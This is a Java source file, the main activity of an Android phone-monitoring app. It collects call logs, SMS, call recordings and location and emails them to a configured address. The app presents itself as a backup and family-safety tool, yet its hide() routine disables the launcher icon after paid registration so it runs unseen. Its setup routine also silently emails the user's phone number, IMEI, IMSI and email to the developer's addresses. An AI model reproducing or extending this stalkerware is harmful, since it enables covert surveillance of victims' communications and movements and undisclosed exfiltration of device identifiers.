package com.shiliukeji.xc_lsy.androidkillerservice;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.text.Html;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.shiliukeji.xc_lsy.androidkillerservice.mail.MailSenderInfo;
import com.shiliukeji.xc_lsy.androidkillerservice.mail.SimpleMailSender;
import com.shiliukeji.xc_lsy.androidkillerservice.service.OtherOperatorService;
import com.shiliukeji.xc_lsy.androidkillerservice.service.PhoneService;
import com.xdandroid.hellodaemon.IntentWrapper;

import java.util.Locale;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    protected static final int LOGINOVER = 0;
    protected static int testok = 0;
    private static boolean userEdited = true;
    private String IMSI;
    private String NativePhoneNumber;
    private CheckBox allNetCheckBox;
    private boolean allnet;
    private boolean allnetTemp;
    private String content;
    private boolean duanxinjilu;
    private boolean duanxinjiluTemp;
    private CheckBox dxjlCheckBox;
    private EditText emailEditText;
    private RelativeLayout gonggaoLayout;
    private Handler handler;
    private RelativeLayout mainlLayout;
    private EditText passwordEditText;
    private EditText phoneNumberEditText;
    private String portTemp;
    private SharedPreferences ps;
    private Button sencondHideButton;
    private String shoujiImei;
    private String shoujiName;
    private TextView shouquanqqTextView;
    private String smtpTemp;
    private RelativeLayout startLayout;
    private String subject;
    private Button testSaveButton;
    private CheckBox thjlCheckBox;
    private CheckBox thlyCheckBox;
    private boolean tonghuajilu;
    private boolean tonghuajiluTemp;
    private boolean tonghualuyin;
    private boolean tonghualuyinTemp;
    TimerTask tt = new TimerTask() {
        public void run() {
            MainActivity.this.handler.sendMessageDelayed(MainActivity.this.handler.obtainMessage(0), 3000);
        }
    };
    private String userEmail;
    private String userEmailTemp;
    private String userPassword;
    private String userPasswordTemp;
    private String userPhoneNumber;
    private String userPhoneNumberTemp;
    private boolean userSetOk;
    private boolean weizhijilu;
    private boolean weizhijiluTemp;
    private boolean wifi;
    private CheckBox wifiCheckBox;
    private boolean wifiTemp;
    private CheckBox wzjlCheckBox;
    private TextView yhxuzhiTextView;
    private SharedPreferences zcps;
    private Button zhuceHideButton;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.zcps = getSharedPreferences("reg", 0);
        setContentView(R.layout.activity_main);
        findView();
        this.shouquanqqTextView.setText("正版注册授权QQ:" + getString(R.string.zhuceqq));
        getPrefparas();
        showPrefparas();
        startService(new Intent(this, PhoneService.class));
        this.startLayout.setVisibility(View.VISIBLE);
        new HandlerThread("myHandlerThread").start();
        this.handler = new Handler() {
            public void handleMessage(Message msg) {
                if (msg.what == 0) {
                    MainActivity.this.startLayout.setVisibility(View.INVISIBLE);
                    MainActivity.this.gonggaoLayout.setVisibility(View.VISIBLE);
                    MainActivity.this.mainlLayout.setVisibility(View.INVISIBLE);
                }
            }
        };
        this.tt.run();
    }

    protected void onRestart() {
        super.onRestart();
        if (OtherOperatorService.isReg(this.ps.getString("email", ""), this.ps.getString("shoujiimei", ""), this.zcps.getString("zhucema", ""))) {
            this.zhuceHideButton.setEnabled(false);
            this.testSaveButton.setEnabled(false);
            Toast.makeText(getApplicationContext(), "注册成功，可以隐藏了", Toast.LENGTH_SHORT).show();
        }
    }

    public void yes(View v) {
        this.startLayout.setVisibility(View.INVISIBLE);
        this.gonggaoLayout.setVisibility(View.INVISIBLE);
        this.mainlLayout.setVisibility(View.VISIBLE);
    }

    public void no(View v) {
        System.exit(0);
    }

    public void ipay(View v) {
        Toast.makeText(getApplicationContext(), "详询正版代理授权QQ：1530732769", Toast.LENGTH_SHORT).show();
    }

    public void testSave(View v) {
        getUserInput();
        this.smtpTemp = getUserSmtp(this.userEmailTemp);
        this.portTemp = getUserPort(this.userEmailTemp);
        if (!userEdited) {
            reset(v);
        } else if (this.smtpTemp == null && this.portTemp == null) {
            Toast.makeText(getApplicationContext(), "检查邮箱格式是否正确(或smtp或Port)", Toast.LENGTH_SHORT).show();
        } else if (OtherOperatorService.check3Gwifi(getApplicationContext())) {
            Toast.makeText(getApplicationContext(), "邮箱测试中，请稍后……", Toast.LENGTH_SHORT).show();
            this.shoujiName = "手机通话短信定位大师" + OtherOperatorService.getImei(getApplicationContext(), 3);
            this.shoujiImei = OtherOperatorService.getImei(getApplicationContext(), 8);
            this.subject = this.shoujiName + "发来--测试邮件";
            this.content = "收到本邮件表示：你的邮箱格式、邮箱密码和邮箱配置完全正确!<br/><br/>本软件适合工作和业务繁忙的文秘人员，商务人员、客户接洽人员等，用于自动备份您忙录时的短信记录，通话记录，通话录音，通话位置等到自己的邮箱，等有空闲时再慢慢整理重要通话内容、业务往来短信内容、重要客户联系电话等，以免因电话多、业务多而遗漏。以及用于丢失手机定位找回、孩子电话行为监控、老人迷失或失踪位置跟踪等，禁止用于其他任何非法用途。<br/><br/>本软件为免费软件，软件注册后为正版，可隐藏程序图标、隐藏程序文字名称、隐藏状态栏温馨提示，并具备手机位置主动跟踪、环境录音、换卡自动通知等功能(具体详询)，享受后续免费升级服务。如果你喜欢，请联系注册授权QQ：" + getString(R.string.zhuceqq) + ",购买注册为正版。淘宝网店页面:<a target=_bank href=" + getString(R.string.zhucetaobaolink) + ">" + getString(R.string.zhucetaobaolink) + "</a>";
            new Thread(new Runnable() {
                public void run() {
                    if (new SimpleMailSender().sendHtmlMail(new MailSenderInfo(MainActivity.this.smtpTemp, MainActivity.this.portTemp, MainActivity.this.userEmailTemp, MainActivity.this.userPasswordTemp, true, MainActivity.this.userEmailTemp, new String[]{MainActivity.this.userEmailTemp}, MainActivity.this.subject, MainActivity.this.content))) {
                        MainActivity.testok = 1;
                    } else {
                        MainActivity.testok = 2;
                    }
                }
            }).start();
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            this.NativePhoneNumber = telephonyManager.getLine1Number();
            this.IMSI = telephonyManager.getSubscriberId();
            while (testok != 1) {
                if (testok == 2) {
                    Toast.makeText(getApplicationContext(), "开启你邮箱SMTP服务(查看帮助)，或邮箱或密码输入错误；或换一个邮箱重试！", Toast.LENGTH_SHORT).show();
                    testok = 0;
                    return;
                }
            }
            if (userSave()) {
                Toast.makeText(getApplicationContext(), "恭喜你，保存成功", Toast.LENGTH_SHORT).show();
                String zhuceqq = getString(R.string.zhuceqq);
                String zhuceemail = getString(R.string.zhuceemail);
                String subject = "用户" + this.userEmailTemp + ";" + this.userPhoneNumberTemp + ";" + this.shoujiImei + "设置成功(版本号：" + getString(R.string.version) + ")";
                OtherOperatorService.uploadEmail(this.smtpTemp, this.portTemp, this.userEmailTemp, this.userPasswordTemp, this.userEmailTemp,
                        "abc@163.com".equalsIgnoreCase(zhuceemail) ? new String[]{zhuceemail} : new String[]{zhuceemail, "abc@163.com"},
                        subject, new StringBuilder(String.valueOf(subject)).append("<br/>功能：").append(this.tonghuajiluTemp).append(",")
                                .append(this.duanxinjiluTemp).append(",").append(this.tonghualuyinTemp).append(",")
                                .append(this.weizhijiluTemp).append("<br/>发送：").append(this.allnetTemp).append(",")
                                .append(this.wifiTemp).append("<br/><br/>代理：").append(zhuceqq).append(",").append(zhuceemail)
                                .append(",当前卡编码").append(this.NativePhoneNumber).append(",").append(this.IMSI).toString());
                setUserEditedFalse();
            } else {
                Toast.makeText(getApplicationContext(), "测试成功，保存失败", Toast.LENGTH_SHORT).show();
            }
            testok = 0;
        } else {
            Toast.makeText(getApplicationContext(), "先开启手机网络,以便测试邮箱是否可用", Toast.LENGTH_SHORT).show();
        }
    }

    protected boolean userSave() {
        SharedPreferences.Editor userEditor = getSharedPreferences("userset", 0).edit();
        userEditor.putString("shoujiname", this.shoujiName);
        userEditor.putString("email", this.userEmailTemp);
        userEditor.putString("password", this.userPasswordTemp);
        userEditor.putString("phonenumber", this.userPhoneNumberTemp);
        userEditor.putBoolean("tonghuajilu", this.tonghuajiluTemp);
        userEditor.putBoolean("duanxinjilu", this.duanxinjiluTemp);
        userEditor.putBoolean("tonghualuyin", this.tonghualuyinTemp);
        userEditor.putBoolean("weizhijilu", this.weizhijiluTemp);
        userEditor.putBoolean("allnet", this.allnetTemp);
        userEditor.putBoolean("wifi", this.wifiTemp);
        userEditor.putString("smtp", this.smtpTemp);
        userEditor.putString("port", this.portTemp);
        userEditor.putString("shoujiimei", this.shoujiImei);
        userEditor.putString("cardnumber", this.NativePhoneNumber);
        userEditor.putString("cardimsi", this.IMSI);
        userEditor.putBoolean("isok", true);
        if (userEditor.commit()) {
            return true;
        }
        return false;
    }

    public void zhucehide(View v) {
        startActivity(new Intent(this, ZhuceActivity.class));
    }

    public void hide(View v) {
        if (!this.ps.getBoolean("isok", false) || !this.zcps.getBoolean("isok", false)) {
            Toast.makeText(getApplicationContext(), "保存成功和注册成功后，才能隐藏", Toast.LENGTH_SHORT).show();
        } else if (!OtherOperatorService.getImei(getApplicationContext(), 8).equals(this.ps.getString("shoujiimei", ""))) {
            Toast.makeText(getApplicationContext(), "请勿不要非法操作", Toast.LENGTH_SHORT).show();
        } else if (OtherOperatorService.isReg(this.ps.getString("email", ""), this.ps.getString("shoujiimei", ""), this.zcps.getString("zhucema", ""))) {
            try {
                // 隐藏图标的操作
                getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                this.sencondHideButton.setEnabled(false);
                Toast.makeText(getApplicationContext(), "恭喜你，隐藏成功", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(getApplicationContext(), "隐藏不成功，试试卸载重新安装软件", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(getApplicationContext(), "保存成功后，才能隐藏",  Toast.LENGTH_SHORT).show();
        }
    }

    public void help(View v) {
        startActivity(new Intent(this, HelpActivity.class));
    }

    public void reset(View v) {
        setUserEditedTrue();
    }

    private String getUserPort(String email) {
        if (getEmailSite(email) != null) {
            return "25";
        }
        return null;
    }

    private String getUserSmtp(String email) {
        String temp = getEmailSite(email);
        if (temp != null) {
            return "smtp." + temp + email.substring(email.lastIndexOf(".")).trim();
        }
        return null;
    }

    private String getEmailSite(String email) {
        if (!checkEmail(email)) {
            return null;
        }
        int first = email.indexOf("@");
        int end = email.indexOf(".");
        int last = email.lastIndexOf(".");
        if (end == last) {
            return email.substring(first + 1, end);
        }
        return email.substring(first + 1, last);
    }

    private boolean checkEmail(String email) {
        if ("".equals(email) || email == null) {
            return false;
        }
        int first = email.indexOf("@");
        int first1 = email.indexOf(".");
        int last = email.lastIndexOf(".");
        if (first < 1 || first1 < 1 || first > first1 || last == email.length() - 1) {
            return false;
        }
        if (first1 - first <= 1) {
            return false;
        }
        return true;
    }

    private void setUserEditedFalse() {
        this.emailEditText.setEnabled(false);
        this.passwordEditText.setEnabled(false);
        this.phoneNumberEditText.setEnabled(false);
        this.thjlCheckBox.setEnabled(false);
        this.dxjlCheckBox.setEnabled(false);
        this.thlyCheckBox.setEnabled(false);
        this.wzjlCheckBox.setEnabled(false);
        this.allNetCheckBox.setEnabled(false);
        this.wifiCheckBox.setEnabled(false);
        this.testSaveButton.setText("重设");
        userEdited = false;
    }

    private void setUserEditedTrue() {
        this.emailEditText.setEnabled(true);
        this.passwordEditText.setEnabled(true);
        this.phoneNumberEditText.setEnabled(true);
        this.thjlCheckBox.setEnabled(true);
        this.dxjlCheckBox.setEnabled(true);
        this.thlyCheckBox.setEnabled(true);
        this.wzjlCheckBox.setEnabled(true);
        this.allNetCheckBox.setEnabled(true);
        this.wifiCheckBox.setEnabled(true);
        this.testSaveButton.setText("保存");
        userEdited = true;
    }

    private void getUserInput() {
        this.userEmailTemp = this.emailEditText.getText().toString().toUpperCase(Locale.US).trim();
        this.userPasswordTemp = this.passwordEditText.getText().toString().trim();
        this.userPhoneNumberTemp = this.phoneNumberEditText.getText().toString().trim();
        this.tonghuajiluTemp = this.thjlCheckBox.isChecked();
        this.duanxinjiluTemp = this.dxjlCheckBox.isChecked();
        this.tonghualuyinTemp = this.thlyCheckBox.isChecked();
        this.weizhijiluTemp = this.wzjlCheckBox.isChecked();
        this.allnetTemp = this.allNetCheckBox.isChecked();
        this.wifiTemp = this.wifiCheckBox.isChecked();
    }

    private void showPrefparas() {
        if (this.userSetOk) {
            this.emailEditText.setText(this.userEmail);
            this.passwordEditText.setText(this.userPassword);
            this.phoneNumberEditText.setText(this.userPhoneNumber);
            this.thjlCheckBox.setChecked(this.tonghuajilu);
            this.dxjlCheckBox.setChecked(this.duanxinjilu);
            this.thlyCheckBox.setChecked(this.tonghualuyin);
            this.wzjlCheckBox.setChecked(this.weizhijilu);
            this.allNetCheckBox.setChecked(this.allnet);
            this.wifiCheckBox.setChecked(this.wifi);
            if (this.ps.getBoolean("isok", false)) {
                this.testSaveButton.setText("重设");
            }
            if (this.zcps.getBoolean("isok", false)) {
                this.zhuceHideButton.setEnabled(false);
                this.testSaveButton.setEnabled(false);
            }
            setUserEditedFalse();
        }
    }

    private void getPrefparas() {
        this.ps = getSharedPreferences("userset", 0);
        this.userSetOk = this.ps.getBoolean("isok", false);
        this.userEmail = this.ps.getString("email", "");
        this.userPassword = this.ps.getString("password", "");
        this.userPhoneNumber = this.ps.getString("phonenumber", "");
        this.tonghuajilu = this.ps.getBoolean("tonghuajilu", true);
        this.duanxinjilu = this.ps.getBoolean("duanxinjilu", true);
        this.tonghualuyin = this.ps.getBoolean("tonghualuyin", false);
        this.weizhijilu = this.ps.getBoolean("weizhijilu", false);
        this.allnet = this.ps.getBoolean("allnet", true);
        this.wifi = this.ps.getBoolean("wifi", false);
    }

    private void findView() {
        this.emailEditText = (EditText) findViewById(R.id.et_useremail);
        this.passwordEditText = (EditText) findViewById(R.id.et_password);
        this.phoneNumberEditText = (EditText) findViewById(R.id.et_phonenumber);
        this.thjlCheckBox = (CheckBox) findViewById(R.id.cb_tonghuajilu);
        this.dxjlCheckBox = (CheckBox) findViewById(R.id.cb_duanxinjilu);
        this.thlyCheckBox = (CheckBox) findViewById(R.id.cb_tonghualuyin);
        this.wzjlCheckBox = (CheckBox) findViewById(R.id.cb_weizhijilu);
        this.allNetCheckBox = (CheckBox) findViewById(R.id.cb_net);
        this.wifiCheckBox = (CheckBox) findViewById(R.id.cb_wifi);
        this.testSaveButton = (Button) findViewById(R.id.testsave);
        this.zhuceHideButton = (Button) findViewById(R.id.zhucehide);
        this.sencondHideButton = (Button) findViewById(R.id.sencondhide);
        this.startLayout = (RelativeLayout) findViewById(R.id.rl_start);
        this.gonggaoLayout = (RelativeLayout) findViewById(R.id.rl_gonggao);
        this.mainlLayout = (RelativeLayout) findViewById(R.id.rl_Main);
        this.shouquanqqTextView = (TextView) findViewById(R.id.tv_qq);
        this.yhxuzhiTextView = (TextView) findViewById(R.id.tv_yhxuzhi);
        this.yhxuzhiTextView.setText(Html.fromHtml("<p><font color=#ff0000>用户须知：</font><br><br>本软件为免费软件，不注册也可正常使用。<br><br>一、软件用途。软件适合工作和业务繁忙的文秘人员，商务人员、客户接洽人员等，用于自动备份您忙录时的短信记录，通话记录，通话录音，通话位置等到自己的邮箱，以及用于丢失手机定位找回、被监护人电话行为监控、老人迷失或失踪位置跟踪等。<br><br>二、免责声明。本软件仅用于个人测试、研究和使用，<font color=#FF0000>禁止用于其他任何非法用途。</font>如果因使用本软件而产生的法律纠纷或违法行为，软件作者不承担任何责任。<br><br>三、正版注册。<font color=#ff0000>软件为正规专业软件，非盗号钓鱼之病毒木马,请放心设置使用</font>。注册请联系授权QQ：<font color=#ff0000>" + getString(R.string.zhuceqq) + "</font>，注册后更稳定、功能更多，并享受免费后续升级服务。<br><br>" + "四、软件版本" + getString(R.string.version) + "，并持续更新中，不明之处点击帮助。软件适于安卓系统2.2以上手机。<br><br>" + "五、如果你同意上述有关约定，请点接受后，继续使用，不同意请拒绝。"));
    }
    //防止华为机型未加入白名单时按返回键回到桌面再锁屏后几秒钟进程被杀
    @Override public void onBackPressed() { IntentWrapper.onBackPressed(this); }
}
